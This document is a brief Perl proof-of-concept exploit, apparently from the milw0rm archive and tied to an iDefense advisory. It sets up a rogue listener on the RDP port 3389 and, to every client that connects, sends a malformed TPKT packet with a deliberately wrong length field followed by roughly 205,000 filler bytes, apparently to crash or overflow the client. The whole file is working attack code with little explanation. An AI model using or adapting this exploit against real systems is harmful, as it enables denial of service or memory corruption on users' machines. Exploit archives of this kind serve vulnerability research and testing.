#!/usr/bin/perl
#
# http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=696

use warnings;
use strict;
use IO::Socket;

my $sock = IO::Socket::INET->new(LocalAddr => '0.0.0.0', LocalPort => '3389', Listen => 1, Reuse => 1) || die($!);

while(my $c = $sock->accept())
{
        print $c        "\x03"                          .# TPKT version
                        "\x00"                          .# reserved
                        "\x00\x01"                      .# evil length here 
                        "\x06\xd0\x00\x00\x12\x34\x00"  .
                        "\x41" x 204942;

        sleep 1;
        close $sock;
}

# milw0rm.com [2008-05-08]
